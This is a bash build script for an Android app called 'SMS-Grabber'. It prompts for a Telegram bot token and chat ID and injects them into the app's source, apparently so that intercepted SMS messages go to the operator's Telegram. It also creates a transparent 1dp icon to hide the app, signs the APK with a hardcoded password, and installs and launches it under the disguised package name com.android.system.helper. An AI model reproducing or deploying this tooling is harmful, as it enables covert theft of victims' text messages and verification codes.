#!/bin/bash
# ============================================================
# SMS-Grabber Build Script v1.1
# Fixed for Termux / local builds
# ============================================================

set -e

# ========== Paths ==========
PROJECT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$PROJECT_DIR"

APK_DEBUG="app/build/outputs/apk/debug/app-debug.apk"
APK_RELEASE="app/build/outputs/apk/release/app-release.apk"
APK_RELEASE_UNSIGNED="app/build/outputs/apk/release/app-release-unsigned.apk"

KEYSTORE="$PROJECT_DIR/smsgrabber.keystore"
KEY_ALIAS="smsgrabber"
KEY_PASS="android123"
TELEGRAM_FILE="$PROJECT_DIR/app/src/main/java/com/smsgrabber/TelegramApi.kt"
LOCAL_PROPS="$PROJECT_DIR/local.properties"

# ========== Colors ==========
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
NC='\033[0m'

banner() {
    clear
    echo -e "${RED}"
    echo "  ╔══════════════════════════════════════════╗"
    echo "  ║       SMS-Grabber Builder v1.1           ║"
    echo "  ║       Android APK Generator              ║"
    echo "  ╚══════════════════════════════════════════╝"
    echo -e "${NC}"
    echo ""
}

log_ok()   { echo -e "${GREEN}[✓]${NC} $1"; }
log_info() { echo -e "${CYAN}[*]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }
log_err()  { echo -e "${RED}[✗]${NC} $1"; }

# ========== 1. Check Java ==========
check_java() {
    log_info "Checking Java..."
    if ! command -v java >/dev/null 2>&1; then
        log_err "Java not found. Install: pkg install openjdk-21"
        exit 1
    fi
    JAVA_VER=$(java -version 2>&1 | head -n1)
    log_ok "Java found: $JAVA_VER"
}

# ========== 2. Setup ANDROID_HOME ==========
setup_android_home() {
    log_info "Checking ANDROID_HOME..."

    if [ -z "$ANDROID_HOME" ]; then
        if [ -n "$ANDROID_SDK_ROOT" ]; then
            export ANDROID_HOME="$ANDROID_SDK_ROOT"
        elif [ -d "$HOME/android-sdk" ]; then
            export ANDROID_HOME="$HOME/android-sdk"
        elif [ -d "$HOME/Android/Sdk" ]; then
            export ANDROID_HOME="$HOME/Android/Sdk"
        elif [ -d "/usr/lib/android-sdk" ]; then
            export ANDROID_HOME="/usr/lib/android-sdk"
        fi
    fi

    if [ -z "$ANDROID_HOME" ] || [ ! -d "$ANDROID_HOME" ]; then
        log_warn "ANDROID_HOME not set / SDK not found"
        log_warn "Build may fail without Android SDK"
    else
        export ANDROID_SDK_ROOT="$ANDROID_HOME"
        export PATH="$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools:$ANDROID_HOME/build-tools/34.0.0"
        log_ok "ANDROID_HOME=$ANDROID_HOME"
    fi

    # Create local.properties if missing
    if [ ! -f "$LOCAL_PROPS" ]; then
        if [ -n "$ANDROID_HOME" ]; then
            echo "sdk.dir=$ANDROID_HOME" > "$LOCAL_PROPS"
            log_ok "Created local.properties"
        else
            log_warn "Skipped local.properties (no ANDROID_HOME)"
        fi
    else
        log_ok "local.properties exists"
    fi
}

# ========== 3. Fix project structure ==========
fix_project() {
    log_info "Fixing project structure..."

    # Drawable
    mkdir -p app/src/main/res/drawable
    if [ ! -f "app/src/main/res/drawable/ic_transparent.xml" ]; then
        cat > app/src/main/res/drawable/ic_transparent.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<vector xmlns:android="http://schemas.android.com/apk/res/android"
    android:width="1dp"
    android:height="1dp"
    android:viewportWidth="1"
    android:viewportHeight="1">
    <path android:fillColor="#00000000" android:pathData="M0,0h1v1h-1z"/>
</vector>
EOF
        log_ok "Created ic_transparent.xml"
    else
        log_ok "ic_transparent.xml OK"
    fi

    # Remove wrong drawable path if empty leftover
    if [ -d "app/src/drawable" ] && [ -z "$(ls -A app/src/drawable 2>/dev/null)" ]; then
        rmdir app/src/drawable 2>/dev/null || true
    fi

    # Move drawable if still in wrong place
    if [ -f "app/src/drawable/ic_transparent.xml" ]; then
        mv -f app/src/drawable/ic_transparent.xml app/src/main/res/drawable/
        rmdir app/src/drawable 2>/dev/null || true
        log_ok "Moved drawable to correct path"
    fi
}

# ========== 4. Telegram config ==========
config_telegram() {
    log_info "Configure Telegram Bot..."

    if [ ! -f "$TELEGRAM_FILE" ]; then
        log_err "TelegramApi.kt not found: $TELEGRAM_FILE"
        exit 1
    fi

    if grep -q "YOUR_BOT_TOKEN_HERE" "$TELEGRAM_FILE" 2>/dev/null; then
        echo -ne "${YELLOW}[?] Enter Bot Token: ${NC}"
        read -r BOT_TOKEN
        echo -ne "${YELLOW}[?] Enter Chat ID: ${NC}"
        read -r CHAT_ID

        if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
            log_err "Token and Chat ID required"
            exit 1
        fi

        # Portable sed (Linux + Termux + macOS)
        if sed --version >/dev/null 2>&1; then
            sed -i "s|YOUR_BOT_TOKEN_HERE|$BOT_TOKEN|g" "$TELEGRAM_FILE"
            sed -i "s|YOUR_CHAT_ID_HERE|$CHAT_ID|g" "$TELEGRAM_FILE"
        else
            sed -i '' "s|YOUR_BOT_TOKEN_HERE|$BOT_TOKEN|g" "$TELEGRAM_FILE"
            sed -i '' "s|YOUR_CHAT_ID_HERE|$CHAT_ID|g" "$TELEGRAM_FILE"
        fi
        log_ok "Telegram configured"
    else
        log_ok "Telegram already configured"
    fi
}

# ========== 5. Keystore ==========
generate_keystore() {
    if [ -f "$KEYSTORE" ]; then
        log_ok "Keystore exists: $KEYSTORE"
        return
    fi

    log_info "Generating keystore..."
    keytool -genkey -v \
        -keystore "$KEYSTORE" \
        -alias "$KEY_ALIAS" \
        -keyalg RSA \
        -keysize 2048 \
        -validity 10000 \
        -storepass "$KEY_PASS" \
        -keypass "$KEY_PASS" \
        -dname "CN=SMS-Grabber, OU=Security, O=SMS-Grabber, L=Unknown, S=Unknown, C=US" \
        >/dev/null 2>&1
    log_ok "Keystore created"
}

# ========== 6. Ensure Gradle / gradlew ==========
setup_gradle() {
    log_info "Checking Gradle..."

    if [ -f "./gradlew" ]; then
        chmod +x ./gradlew
        GRADLE_CMD="./gradlew"
        log_ok "Using ./gradlew"
        return
    fi

    if command -v gradle >/dev/null 2>&1; then
        log_info "gradlew missing — generating wrapper..."
        gradle wrapper --gradle-version 8.5
        if [ -f "./gradlew" ]; then
            chmod +x ./gradlew
            GRADLE_CMD="./gradlew"
            log_ok "Wrapper created"
            return
        fi
        GRADLE_CMD="gradle"
        log_warn "Using system gradle"
        return
    fi

    log_err "Neither gradlew nor gradle found!"
    echo ""
    echo -e "${YELLOW}Install Gradle first:${NC}"
    echo "  pkg install openjdk-21 wget unzip"
    echo "  cd ~ && wget https://services.gradle.org/distributions/gradle-8.5-bin.zip"
    echo "  unzip gradle-8.5-bin.zip"
    echo "  export PATH=\"\$HOME/gradle-8.5/bin:\$PATH\""
    echo "  cd ~/camorro && gradle wrapper --gradle-version 8.5"
    echo "  ./build.sh"
    exit 1
}

# ========== 7. Build ==========
build_apk() {
    log_info "Building APK (debug first — more reliable)..."
    echo ""

    # Debug first (no signing/proguard issues)
    $GRADLE_CMD clean assembleDebug --stacktrace --no-daemon || {
        log_err "Debug build failed"
        exit 1
    }

    if [ -f "$APK_DEBUG" ]; then
        cp -f "$APK_DEBUG" "$PROJECT_DIR/smsgrabber-debug.apk"
        log_ok "Debug APK: smsgrabber-debug.apk"
    else
        log_err "Debug APK not found after build"
        exit 1
    fi

    # Optional release
    log_info "Trying release build..."
    if $GRADLE_CMD assembleRelease --stacktrace --no-daemon; then
        if [ -f "$APK_RELEASE" ]; then
            cp -f "$APK_RELEASE" "$PROJECT_DIR/smsgrabber-signed.apk"
            log_ok "Release APK: smsgrabber-signed.apk"
        elif [ -f "$APK_RELEASE_UNSIGNED" ]; then
            cp -f "$APK_RELEASE_UNSIGNED" "$PROJECT_DIR/smsgrabber-unsigned.apk"
            log_ok "Unsigned release APK: smsgrabber-unsigned.apk"
            sign_apk_if_possible
        fi
    else
        log_warn "Release failed — use debug APK"
    fi
}

sign_apk_if_possible() {
    if [ ! -f "$PROJECT_DIR/smsgrabber-unsigned.apk" ]; then
        return
    fi

    log_info "Signing APK..."
    if command -v apksigner >/dev/null 2>&1; then
        apksigner sign \
            --ks "$KEYSTORE" \
            --ks-key-alias "$KEY_ALIAS" \
            --ks-pass "pass:$KEY_PASS" \
            --key-pass "pass:$KEY_PASS" \
            --out "$PROJECT_DIR/smsgrabber-signed.apk" \
            "$PROJECT_DIR/smsgrabber-unsigned.apk" && \
        log_ok "Signed with apksigner" && return
    fi

    if command -v jarsigner >/dev/null 2>&1; then
        jarsigner -sigalg SHA256withRSA -digestalg SHA-256 \
            -keystore "$KEYSTORE" \
            -storepass "$KEY_PASS" -keypass "$KEY_PASS" \
            "$PROJECT_DIR/smsgrabber-unsigned.apk" "$KEY_ALIAS"
        cp -f "$PROJECT_DIR/smsgrabber-unsigned.apk" "$PROJECT_DIR/smsgrabber-signed.apk"
        log_ok "Signed with jarsigner"
        return
    fi

    log_warn "No signer found — use debug APK"
}

# ========== 8. Install (optional) ==========
install_apk() {
    if ! command -v adb >/dev/null 2>&1; then
        return
    fi
    if ! adb devices 2>/dev/null | grep -q "device$"; then
        return
    fi

    APK_TO_INSTALL=""
    if [ -f "$PROJECT_DIR/smsgrabber-signed.apk" ]; then
        APK_TO_INSTALL="$PROJECT_DIR/smsgrabber-signed.apk"
    elif [ -f "$PROJECT_DIR/smsgrabber-debug.apk" ]; then
        APK_TO_INSTALL="$PROJECT_DIR/smsgrabber-debug.apk"
    else
        return
    fi

    echo ""
    echo -ne "${YELLOW}[?] Install on connected device? [y/N]: ${NC}"
    read -r ANS
    if [ "$ANS" = "y" ] || [ "$ANS" = "Y" ]; then
        adb install -r "$APK_TO_INSTALL"
        log_ok "Installed: $APK_TO_INSTALL"
        adb shell am start -n com.android.system.helper/com.smsgrabber.MainActivity 2>/dev/null || true
    fi
}

# ========== 9. Summary ==========
summary() {
    echo ""
    echo -e "${GREEN}╔══════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║            BUILD COMPLETE                ║${NC}"
    echo -e "${GREEN}╠══════════════════════════════════════════╣${NC}"

    for f in smsgrabber-debug.apk smsgrabber-signed.apk smsgrabber-unsigned.apk; do
        if [ -f "$PROJECT_DIR/$f" ]; then
            SIZE=$(du -h "$PROJECT_DIR/$f" | cut -f1)
            echo -e "${GREEN}║  📦 $f ($SIZE)${NC}"
        fi
    done

    echo -e "${GREEN}╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "Install: ${CYAN}adb install -r smsgrabber-debug.apk${NC}"
    echo -e "Or copy APK to phone and install manually."
    echo ""
}

# ========== Main ==========
main() {
    banner
    check_java
    setup_android_home
    fix_project
    config_telegram
    generate_keystore
    setup_gradle
    build_apk
    install_apk
    summary
}

main "$@"
